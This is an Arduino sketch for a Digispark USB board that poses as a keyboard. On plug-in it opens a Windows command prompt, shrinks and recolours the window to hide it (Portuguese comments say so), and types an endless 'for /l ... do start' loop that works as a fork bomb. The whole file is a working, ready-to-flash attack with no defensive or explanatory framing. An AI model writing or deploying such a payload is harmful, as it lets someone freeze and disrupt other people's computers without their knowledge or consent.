#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //Esconde o Terminal
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Ativa the fork bomb
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {}
}
